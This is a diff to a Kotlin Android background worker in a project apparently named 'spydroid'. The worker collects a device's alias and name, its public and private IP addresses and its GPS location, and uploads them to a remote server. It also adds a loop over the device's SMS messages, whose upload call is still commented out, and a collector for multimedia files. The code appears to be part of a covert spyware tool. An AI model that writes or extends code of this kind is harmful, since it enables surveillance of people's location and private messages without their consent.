@@ -19,8 +19,6 @@ package net.spydroid.feature.sharedata
 
 import android.content.Context
 import android.net.Uri
-import android.os.Build
-import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
 import kotlinx.coroutines.CoroutineScope
@@ -34,25 +32,6 @@ import net.spydroid.common.remote.network.models.Devices
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
-import java.util.Locale
-
-
-private fun getDeviceAlias() =
-    "${Build.MANUFACTURER}_${Build.MODEL}_${Build.VERSION.RELEASE}"
-        .uppercase(Locale.getDefault())
-
-private fun getDeviceName(): String {
-    return try {
-        val process = Runtime.getRuntime().exec("whoami")
-        val reader = process.inputStream.bufferedReader()
-        val resultado = reader.readText().trim()
-        reader.close()
-        resultado
-    } catch (e: Exception) {
-        e.printStackTrace()
-        ""
-    }
-}
 
 
 class ShareDataWork(private val appContext: Context, workerParams: WorkerParameters) :
@@ -65,17 +44,28 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
     private val managerDeviceAddress = ManagerDeviceAddress(appContext)
 
     private lateinit var location: String
+    private lateinit var alias: String
+    private lateinit var name: String
 
     init {
-
-        managerDeviceAddress.getAllIPAddresses().forEach {
-            Log.e("ADDRES_DEVICE", "all address: $it")
-        }
 
         scope.launch {
             localDataProvider.currentLocation.collect {
                 if (it.longitude != null && it.latitude != null)
                     location = "${it.latitude},${it.longitude}"
+            }
+        }
+
+        scope.launch {
+            localDataProvider.aliasDevice.collect{
+                if(it.isNotBlank())
+                    alias = it
+            }
+        }
+        scope.launch { 
+            localDataProvider.nameDevice.collect{
+                if (it.isNotBlank())
+                    name = it
             }
         }
     }
@@ -113,15 +103,16 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
             scope.launch {
 
 
-                remoteDataProvider.unuploadedDataToInternet.collect { uploadesData ->
-                    val alias = getDeviceAlias()
-                    val name = getDeviceName()
+                remoteDataProvider.unuploadedDevicesToInternet.collect { uploadesData ->
+
+                    val alias = alias
+                    val name = name
                     val ip_address_private = managerDeviceAddress.getPrivateIPAddress()
                     val currentLocation = location
 
                     managerDeviceAddress.getPublicIPAddress { ip_address_public ->
                         if (
-                           !uploadesData &&
+                            !uploadesData &&
                             alias.isNotEmpty() &&
                             name.isNotEmpty() &&
                             ip_address_public.isNotEmpty() &&
@@ -133,17 +124,18 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
                                     name = name,
                                     ip_address_public = ip_address_public,
                                     ip_address_private = ip_address_private,
-                                    location = if(currentLocation ==
+                                    location = if (currentLocation ==
                                         "${
                                             GLOBAL_STATES_PERMISSIONS.UN_REQUEST
                                         },${
                                             GLOBAL_STATES_PERMISSIONS.UN_REQUEST
-                                        }"  ) "Not Found"
+                                        }"
+                                    ) "Not Found"
                                     else currentLocation
                                 )
                             )
 
-                            remoteDataProvider.setStateDataInternet(true)
+                            remoteDataProvider.setStateDevicesInternet(true)
                         } else {
                             /*
                           remoteDataProvider.updateDevice(
@@ -162,26 +154,27 @@ class ShareDataWork(private val appContext: Context, workerParams: WorkerParamet
             }
 
 
-            /*
 
-           scope.launch {
-                localDataProvider.currentMutimedia.collect {
+            scope.launch {
+                localDataProvider.currentSms.collect { smsData ->
                     withContext(Dispatchers.IO) {
-
-                       if (!it.documents.isNullOrEmpty()) {
-                            it.documents!!.map { uri ->
-                               remoteDataProvider.setFile(
-                                    getFileFromUri(uri),
-                                    type = "DOCUMENT",
-                                    alias = "PRUEBA_A03s"
-                                )
+                        if (smsData.isNotEmpty()) {
+                            smsData.forEachIndexed { index, it ->
+                                launch {
+                                /*
+                                                                    remoteDataProvider.setSms(
+                                        SmsDevices(
+                                            alias = getDeviceAlias(),
+                                            sms = it.body.orEmpty()
+                                        )
+                                    )
+                                 */
+                                }.join()
                             }
                         }
                     }
                 }
             }
-
-             */
 
             scope.launch {
                 localDataProvider.currentMutimedia.collect { multimediaData ->
